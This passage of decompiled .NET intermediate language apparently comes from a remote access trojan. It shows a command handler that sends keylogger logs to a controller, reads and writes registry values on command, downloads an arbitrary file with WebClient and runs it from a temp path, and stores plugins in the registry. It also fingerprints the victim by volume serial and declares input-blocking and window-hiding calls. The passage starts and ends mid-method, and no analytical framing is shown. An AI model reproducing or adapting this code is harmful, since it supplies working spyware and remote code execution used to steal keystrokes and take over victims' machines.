      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  stloc.3
      IL_004a:  nop
      IL_004b:  ldloc.3
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0051:  nop
      IL_0052:  ldloc.3
      IL_0053:  stloc.2
      IL_0054:  ldarg.1
      IL_0055:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  8
    .locals init (string V_0,
             string V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             string V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldnull
      IL_0003:  stloc.s    V_5
      IL_0005:  ldc.i4.0
      IL_0006:  stloc.s    V_4
      IL_0008:  ldc.i4.0
      IL_0009:  stloc.2
      IL_000a:  ldnull
      IL_000b:  stloc.3
      IL_000c:  ldstr      "SystemDrive"
      IL_0011:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0016:  ldstr      "\\"
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  stloc.s    V_9
      IL_0022:  ldloca.s   V_9
      IL_0024:  ldloca.s   V_5
      IL_0026:  ldc.i4.0
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_2
      IL_002d:  ldloca.s   V_3
      IL_002f:  ldc.i4.0
      IL_0030:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0035:  pop
      IL_0036:  ldloc.s    V_6
      IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003d:  stloc.1
      IL_003e:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0040:  dup
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  stloc.s    V_8
      IL_0048:  nop
      IL_0049:  ldloc.s    V_8
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0050:  nop
      IL_0051:  ldloc.s    V_8
      IL_0053:  stloc.s    V_7
      IL_0055:  ldstr      "ERR"
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("user32" as "BlockInput" nomangle ansi lasterr winapi) 
          int32  apiBlockInput(int32 fBlock) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  GetWindow(native int hWnd,
                                uint32 uCmd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  IsWindowVisible(native int hwnd) cil managed preservesig
  {
  }
  .method public static void  Toggle() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  2
    .locals init (native int V_0,
             bool V_1)
    IL_0000:  nop
    IL_0001:  ldstr      "ProgMan"
    IL_0006:  ldnull
    IL_0007:  call       native int j.OK::FindWindow(string,
                                                     string)
    IL_000c:  stloc.0
    IL_000d:  ldloc.0
    IL_000e:  ldc.i4.5
    IL_000f:  call       native int j.OK::GetWindow(native int,
                                                    uint32)
    IL_0014:  stloc.0
    IL_0015:  ldloc.0
    IL_0016:  call       bool j.OK::IsWindowVisible(native int)
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  brfalse.s  IL_0029

    IL_001f:  ldloc.0
    IL_0020:  ldc.i4.0
    IL_0021:  call       bool j.OK::ShowWindow(native int,
                                               int32)
    IL_0026:  pop
    IL_0027:  br.s       IL_0032

    IL_0029:  nop
    IL_002a:  ldloc.0
    IL_002b:  ldc.i4.4
    IL_002c:  call       bool j.OK::ShowWindow(native int,
                                               int32)
    IL_0031:  pop
    IL_0032:  nop
    IL_0033:  nop
    IL_0034:  ret
  } // end of method OK::Toggle

  .method private static pinvokeimpl("user32" as "SystemParametersInfoA" nomangle ansi lasterr winapi) 
          int32  SystemParametersInfo(int32 uAction,
                                      int32 uParam,
                                      string&  marshal( byvalstr) lpvParam,
                                      int32 fuWinIni) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       4800 (0x12c0)
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             uint8[] V_2,
             class [System]System.Net.WebClient V_3,
             class [System]System.Net.WebClient V_4,
             string V_5,
             string V_6,
             string V_7,
             int32 V_8,
             class [mscorlib]System.IO.MemoryStream V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             uint8[] V_16,
             object V_17,
             int32 V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             uint8[] V_20,
             object V_21,
             int32 V_22,
             class [mscorlib]System.IO.MemoryStream V_23,
             class [System.Drawing]System.Drawing.Bitmap V_24,
             valuetype [System.Drawing]System.Drawing.Size V_25,
             valuetype [System.Drawing]System.Drawing.Rectangle V_26,
             class [System.Drawing]System.Drawing.Graphics V_27,
             class [System.Drawing]System.Drawing.Bitmap V_28,
             string V_29,
             class [mscorlib]System.IO.MemoryStream V_30,
             class [mscorlib]System.IO.MemoryStream V_31,
             class [mscorlib]System.Exception V_32,
             class [mscorlib]System.Exception V_33,
             class [System]System.Diagnostics.Process V_34,
             class [System]System.Diagnostics.Process V_35,
             int32 V_36,
             class [mscorlib]System.IO.MemoryStream V_37,
             class [mscorlib]System.Exception V_38,
             class [mscorlib]System.Exception V_39,
             class [mscorlib]System.Exception V_40,
             class [mscorlib]System.Exception V_41,
             class [mscorlib]System.Exception V_42,
             class [mscorlib]System.Exception V_43,
             object[] V_44,
             bool[] V_45,
             int32 V_46,
             int32 V_47,
             class [mscorlib]System.IO.MemoryStream V_48,
             class [mscorlib]System.Exception V_49,
             class [mscorlib]System.Exception V_50,
             class [mscorlib]System.Exception V_51,
             class [mscorlib]System.Exception V_52,
             string V_53,
             string V_54,
             string V_55,
             string[] V_56,
             object[] V_57,
             string V_58,
             valuetype [System.Drawing]System.Drawing.Rectangle V_59,
             valuetype [System.Drawing]System.Drawing.Rectangle V_60,
             valuetype [System.Drawing]System.Drawing.Rectangle V_61,
             valuetype [System.Drawing]System.Drawing.Rectangle V_62,
             string V_63,
             int32 V_64,
             class [System]System.Diagnostics.Process[] V_65,
             int32 V_66,
             class [System]System.Diagnostics.Process[] V_67,
             valuetype [System.Drawing]System.Drawing.Point V_68,
             valuetype [System.Drawing]System.Drawing.Point V_69,
             valuetype [System.Drawing]System.Drawing.Color V_70,
             bool[] V_71,
             bool V_72,
             bool V_73)
    IL_0000:  nop
    IL_0001:  ldarga.s   b
    IL_0003:  call       string j.OK::BS(uint8[]&)
    IL_0008:  ldsfld     string j.OK::Y
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    IL_0015:  nop
    .try
    {
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.s    V_7
      IL_001b:  nop
      IL_001c:  ldloc.s    V_7
      IL_001e:  stloc.s    V_53
      IL_0020:  nop
      IL_0021:  ldloc.s    V_53
      IL_0023:  ldstr      "ll"
      IL_0028:  ldc.i4.0
      IL_0029:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_002e:  ldc.i4.0
      IL_002f:  ceq
      IL_0031:  stloc.s    V_72
      IL_0033:  ldloc.s    V_72
      IL_0035:  brfalse.s  IL_0049

      IL_0037:  nop
      IL_0038:  ldc.i4.0
      IL_0039:  stsfld     bool j.OK::Cn
      IL_003e:  nop
      IL_003f:  leave      IL_12be

      IL_0044:  br         IL_0174

      IL_0049:  nop
      IL_004a:  ldloc.s    V_53
      IL_004c:  ldstr      "kl"
      IL_0051:  ldc.i4.0
      IL_0052:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0057:  ldc.i4.0
      IL_0058:  ceq
      IL_005a:  stloc.s    V_72
      IL_005c:  ldloc.s    V_72
      IL_005e:  brfalse.s  IL_0090

      IL_0060:  nop
      IL_0061:  ldstr      "kl"
      IL_0066:  ldsfld     string j.OK::Y
      IL_006b:  ldsfld     class j.kl j.OK::kq
      IL_0070:  ldflda     string j.kl::Logs
      IL_0075:  call       string j.OK::ENB(string&)
      IL_007a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_007f:  call       bool j.OK::Send(string)
      IL_0084:  pop
      IL_0085:  nop
      IL_0086:  leave      IL_12be

      IL_008b:  br         IL_0174

      IL_0090:  nop
      IL_0091:  ldloc.s    V_53
      IL_0093:  ldstr      "prof"
      IL_0098:  ldc.i4.0
      IL_0099:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_009e:  ldc.i4.0
      IL_009f:  ceq
      IL_00a1:  stloc.s    V_72
      IL_00a3:  ldloc.s    V_72
      IL_00a5:  brfalse    IL_0174

      IL_00aa:  nop
      IL_00ab:  nop
      IL_00ac:  ldloc.0
      IL_00ad:  ldc.i4.1
      IL_00ae:  ldelem.ref
      IL_00af:  stloc.s    V_54
      IL_00b1:  nop
      IL_00b2:  ldloc.s    V_54
      IL_00b4:  ldstr      "~"
      IL_00b9:  ldc.i4.0
      IL_00ba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00bf:  ldc.i4.0
      IL_00c0:  ceq
      IL_00c2:  stloc.s    V_73
      IL_00c4:  ldloc.s    V_73
      IL_00c6:  brfalse.s  IL_00e1

      IL_00c8:  nop
      IL_00c9:  ldloc.0
      IL_00ca:  ldc.i4.2
      IL_00cb:  ldelem.ref
      IL_00cc:  ldloc.0
      IL_00cd:  ldc.i4.3
      IL_00ce:  ldelem.ref
      IL_00cf:  ldc.i4.1
      IL_00d0:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00d5:  pop
      IL_00d6:  nop
      IL_00d7:  br         IL_016d

      IL_00dc:  br         IL_016d

      IL_00e1:  nop
      IL_00e2:  ldloc.s    V_54
      IL_00e4:  ldstr      "!"
      IL_00e9:  ldc.i4.0
      IL_00ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00ef:  ldc.i4.0
      IL_00f0:  ceq
      IL_00f2:  stloc.s    V_73
      IL_00f4:  ldloc.s    V_73
      IL_00f6:  brfalse.s  IL_0149

      IL_00f8:  nop
      IL_00f9:  ldloc.0
      IL_00fa:  ldc.i4.2
      IL_00fb:  ldelem.ref
      IL_00fc:  ldloc.0
      IL_00fd:  ldc.i4.3
      IL_00fe:  ldelem.ref
      IL_00ff:  ldc.i4.1
      IL_0100:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0105:  pop
      IL_0106:  ldstr      "getvalue"
      IL_010b:  ldsfld     string j.OK::Y
      IL_0110:  ldloc.0
      IL_0111:  ldc.i4.1
      IL_0112:  ldelem.ref
      IL_0113:  ldsfld     string j.OK::Y
      IL_0118:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_011d:  ldloc.0
      IL_011e:  ldc.i4.1
      IL_011f:  ldelem.ref
      IL_0120:  ldstr      ""
      IL_0125:  call       object j.OK::GTV(string,
                                            object)
      IL_012a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_012f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0134:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0139:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_013e:  call       bool j.OK::Send(string)
      IL_0143:  pop
      IL_0144:  nop
      IL_0145:  br.s       IL_016d

      IL_0147:  br.s       IL_016d

      IL_0149:  nop
      IL_014a:  ldloc.s    V_54
      IL_014c:  ldstr      "@"
      IL_0151:  ldc.i4.0
      IL_0152:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0157:  ldc.i4.0
      IL_0158:  ceq
      IL_015a:  stloc.s    V_73
      IL_015c:  ldloc.s    V_73
      IL_015e:  brfalse.s  IL_016d

      IL_0160:  nop
      IL_0161:  ldloc.0
      IL_0162:  ldc.i4.2
      IL_0163:  ldelem.ref
      IL_0164:  call       void j.OK::DLV(string)
      IL_0169:  nop
      IL_016a:  nop
      IL_016b:  br.s       IL_016d

      IL_016d:  nop
      IL_016e:  nop
      IL_016f:  leave      IL_12be

      IL_0174:  nop
      IL_0175:  ldloc.s    V_7
      IL_0177:  ldstr      "rn"
      IL_017c:  ldc.i4.0
      IL_017d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0182:  ldc.i4.0
      IL_0183:  ceq
      IL_0185:  ldc.i4.0
      IL_0186:  ceq
      IL_0188:  stloc.s    V_73
      IL_018a:  ldloc.s    V_73
      IL_018c:  brfalse.s  IL_0193

      IL_018e:  br         IL_035f

      IL_0193:  nop
      IL_0194:  ldloc.0
      IL_0195:  ldc.i4.2
      IL_0196:  ldelem.ref
      IL_0197:  ldc.i4.0
      IL_0198:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_019d:  ldc.i4.s   31
      IL_019f:  ceq
      IL_01a1:  stloc.s    V_73
      IL_01a3:  ldloc.s    V_73
      IL_01a5:  brfalse    IL_0247

      IL_01aa:  nop
      .try
      {
        IL_01ab:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_01b0:  stloc.s    V_9
        IL_01b2:  ldloc.0
        IL_01b3:  ldc.i4.0
        IL_01b4:  ldelem.ref
        IL_01b5:  ldsfld     string j.OK::Y
        IL_01ba:  ldloc.0
        IL_01bb:  ldc.i4.1
        IL_01bc:  ldelem.ref
        IL_01bd:  ldsfld     string j.OK::Y
        IL_01c2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_01c7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_01cc:  stloc.s    V_8
        IL_01ce:  ldloc.s    V_9
        IL_01d0:  ldarg.0
        IL_01d1:  ldloc.s    V_8
        IL_01d3:  ldarg.0
        IL_01d4:  ldlen
        IL_01d5:  conv.ovf.i4
        IL_01d6:  ldloc.s    V_8
        IL_01d8:  sub.ovf
        IL_01d9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_01de:  nop
        IL_01df:  ldloc.s    V_9
        IL_01e1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_01e6:  call       uint8[] j.OK::ZIP(uint8[])
        IL_01eb:  stloc.1
        IL_01ec:  nop
        IL_01ed:  leave      IL_02af

        IL_01f2:  leave.s    IL_0246

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01f4:  dup
        IL_01f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01fa:  stloc.s    V_11
        IL_01fc:  nop
        IL_01fd:  ldloc.s    V_11
        IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0204:  nop
        IL_0205:  ldloc.s    V_11
        IL_0207:  stloc.s    V_10
        IL_0209:  ldstr      "MSG"
        IL_020e:  ldsfld     string j.OK::Y
        IL_0213:  ldstr      "Execute ERROR"
        IL_0218:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_021d:  call       bool j.OK::Send(string)
        IL_0222:  pop
        IL_0223:  ldstr      "bla"
        IL_0228:  call       bool j.OK::Send(string)
        IL_022d:  pop
        IL_022e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0233:  nop
        IL_0234:  nop
        IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_023a:  leave      IL_12be

        IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0244:  leave.s    IL_0246

      }  // end handler
      IL_0246:  nop
      IL_0247:  nop
      IL_0248:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_024d:  stloc.3
      IL_024e:  nop
      .try
      {
        IL_024f:  ldloc.3
        IL_0250:  ldloc.0
        IL_0251:  ldc.i4.2
        IL_0252:  ldelem.ref
        IL_0253:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0258:  stloc.1
        IL_0259:  leave.s    IL_02ad

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_025b:  dup
        IL_025c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0261:  stloc.s    V_12
        IL_0263:  nop
        IL_0264:  ldloc.s    V_12
        IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_026b:  nop
        IL_026c:  ldloc.s    V_12
        IL_026e:  stloc.s    V_13
        IL_0270:  ldstr      "MSG"
        IL_0275:  ldsfld     string j.OK::Y
        IL_027a:  ldstr      "Download ERROR"
        IL_027f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0284:  call       bool j.OK::Send(string)
        IL_0289:  pop
        IL_028a:  ldstr      "bla"
        IL_028f:  call       bool j.OK::Send(string)
        IL_0294:  pop
        IL_0295:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_029a:  nop
        IL_029b:  nop
        IL_029c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02a1:  leave      IL_12be

        IL_02a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ab:  leave.s    IL_02ad

      }  // end handler
      IL_02ad:  nop
      IL_02ae:  nop
      IL_02af:  nop
      IL_02b0:  ldstr      "bla"
      IL_02b5:  call       bool j.OK::Send(string)
      IL_02ba:  pop
      IL_02bb:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_02c0:  ldstr      "."
      IL_02c5:  ldloc.0
      IL_02c6:  ldc.i4.1
      IL_02c7:  ldelem.ref
      IL_02c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02cd:  stloc.s    V_6
      IL_02cf:  nop
      .try
      {
        IL_02d0:  ldloc.s    V_6
        IL_02d2:  ldloc.1
        IL_02d3:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_02d8:  nop
        IL_02d9:  ldloc.s    V_6
        IL_02db:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_02e0:  pop
        IL_02e1:  ldstr      "MSG"
        IL_02e6:  ldsfld     string j.OK::Y
        IL_02eb:  ldstr      "Executed As "
        IL_02f0:  ldloc.s    V_6
        IL_02f2:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_02f7:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_02fc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0301:  call       bool j.OK::Send(string)
        IL_0306:  pop
        IL_0307:  nop
        IL_0308:  leave      IL_12be

        IL_030d:  leave.s    IL_035d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_030f:  dup
        IL_0310:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0315:  stloc.s    V_14
        IL_0317:  nop
        IL_0318:  ldloc.s    V_14
        IL_031a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_031f:  nop
        IL_0320:  ldloc.s    V_14
        IL_0322:  stloc.s    V_15
        IL_0324:  ldstr      "MSG"
        IL_0329:  ldsfld     string j.OK::Y
        IL_032e:  ldstr      "Execute ERROR "
        IL_0333:  ldloc.s    V_15
        IL_0335:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_033a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_033f:  call       bool j.OK::Send(string)
        IL_0344:  pop
        IL_0345:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_034a:  nop
        IL_034b:  nop
        IL_034c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0351:  leave      IL_12be

        IL_0356:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_035b:  leave.s    IL_035d

      }  // end handler
      IL_035d:  nop
      IL_035e:  nop
      IL_035f:  nop
      IL_0360:  nop
      IL_0361:  ldloc.s    V_7
      IL_0363:  stloc.s    V_55
      IL_0365:  nop
      IL_0366:  ldloc.s    V_55
      IL_0368:  ldstr      "inv"
      IL_036d:  ldc.i4.0
      IL_036e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0373:  ldc.i4.0
      IL_0374:  ceq
      IL_0376:  stloc.s    V_73
      IL_0378:  ldloc.s    V_73
      IL_037a:  brfalse    IL_061b

      IL_037f:  nop
      IL_0380:  ldloc.0
      IL_0381:  ldc.i4.1
      IL_0382:  ldelem.ref
      IL_0383:  ldc.i4.0
      IL_0384:  newarr     [mscorlib]System.Byte
      IL_0389:  call       object j.OK::GTV(string,
                                            object)
      IL_038e:  castclass  uint8[]
      IL_0393:  stloc.s    V_16
      IL_0395:  ldloc.0
      IL_0396:  ldc.i4.3
      IL_0397:  ldelem.ref
      IL_0398:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_039d:  ldc.i4.s   10
      IL_039f:  clt
      IL_03a1:  ldloc.s    V_16
      IL_03a3:  ldlen
      IL_03a4:  conv.ovf.i4
      IL_03a5:  ldc.i4.0
      IL_03a6:  ceq
      IL_03a8:  and
      IL_03a9:  stloc.s    V_73
      IL_03ab:  ldloc.s    V_73
      IL_03ad:  brfalse.s  IL_03fa

      IL_03af:  ldc.i4.5
      IL_03b0:  newarr     [mscorlib]System.String
      IL_03b5:  stloc.s    V_56
      IL_03b7:  ldloc.s    V_56
      IL_03b9:  ldc.i4.0
      IL_03ba:  ldstr      "pl"
      IL_03bf:  stelem.ref
      IL_03c0:  nop
      IL_03c1:  ldloc.s    V_56
      IL_03c3:  ldc.i4.1
      IL_03c4:  ldsfld     string j.OK::Y
      IL_03c9:  stelem.ref
      IL_03ca:  nop
      IL_03cb:  ldloc.s    V_56
      IL_03cd:  ldc.i4.2
      IL_03ce:  ldloc.0
      IL_03cf:  ldc.i4.1
      IL_03d0:  ldelem.ref
      IL_03d1:  stelem.ref
      IL_03d2:  nop
      IL_03d3:  ldloc.s    V_56
      IL_03d5:  ldc.i4.3
      IL_03d6:  ldsfld     string j.OK::Y
      IL_03db:  stelem.ref
      IL_03dc:  nop
      IL_03dd:  ldloc.s    V_56
      IL_03df:  ldc.i4.4
      IL_03e0:  ldc.i4.1
      IL_03e1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_03e6:  stelem.ref
      IL_03e7:  nop
      IL_03e8:  ldloc.s    V_56
      IL_03ea:  call       string [mscorlib]System.String::Concat(string[])
      IL_03ef:  call       bool j.OK::Send(string)
      IL_03f4:  pop
      IL_03f5:  br         IL_060f

      IL_03fa:  nop
      IL_03fb:  ldloc.0
      IL_03fc:  ldc.i4.3
      IL_03fd:  ldelem.ref
      IL_03fe:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0403:  ldc.i4.s   10
      IL_0405:  cgt
      IL_0407:  stloc.s    V_73
      IL_0409:  ldloc.s    V_73
      IL_040b:  brfalse.s  IL_048b

      IL_040d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0412:  stloc.s    V_19
      IL_0414:  ldc.i4.6
      IL_0415:  newarr     [mscorlib]System.String
      IL_041a:  stloc.s    V_56
      IL_041c:  ldloc.s    V_56
      IL_041e:  ldc.i4.0
      IL_041f:  ldloc.0
      IL_0420:  ldc.i4.0
      IL_0421:  ldelem.ref
      IL_0422:  stelem.ref
      IL_0423:  nop
      IL_0424:  ldloc.s    V_56
      IL_0426:  ldc.i4.1
      IL_0427:  ldsfld     string j.OK::Y
      IL_042c:  stelem.ref
      IL_042d:  nop
      IL_042e:  ldloc.s    V_56
      IL_0430:  ldc.i4.2
      IL_0431:  ldloc.0
      IL_0432:  ldc.i4.1
      IL_0433:  ldelem.ref
      IL_0434:  stelem.ref
      IL_0435:  nop
      IL_0436:  ldloc.s    V_56
      IL_0438:  ldc.i4.3
      IL_0439:  ldsfld     string j.OK::Y
      IL_043e:  stelem.ref
      IL_043f:  nop
      IL_0440:  ldloc.s    V_56
      IL_0442:  ldc.i4.4
      IL_0443:  ldloc.0
      IL_0444:  ldc.i4.2
      IL_0445:  ldelem.ref
      IL_0446:  stelem.ref
      IL_0447:  nop
      IL_0448:  ldloc.s    V_56
      IL_044a:  ldc.i4.5
      IL_044b:  ldsfld     string j.OK::Y
      IL_0450:  stelem.ref
      IL_0451:  nop
      IL_0452:  ldloc.s    V_56
      IL_0454:  call       string [mscorlib]System.String::Concat(string[])
      IL_0459:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_045e:  stloc.s    V_18
      IL_0460:  ldloc.s    V_19
      IL_0462:  ldarg.0
      IL_0463:  ldloc.s    V_18
      IL_0465:  ldarg.0
      IL_0466:  ldlen
      IL_0467:  conv.ovf.i4
      IL_0468:  ldloc.s    V_18
      IL_046a:  sub.ovf
      IL_046b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0470:  nop
      IL_0471:  ldloc.s    V_19
      IL_0473:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0478:  call       uint8[] j.OK::ZIP(uint8[])
      IL_047d:  stloc.s    V_16
      IL_047f:  ldloc.0
      IL_0480:  ldc.i4.1
      IL_0481:  ldelem.ref
      IL_0482:  ldloc.s    V_16
      IL_0484:  ldc.i4.3
      IL_0485:  call       bool j.OK::STV(string,
                                          object,
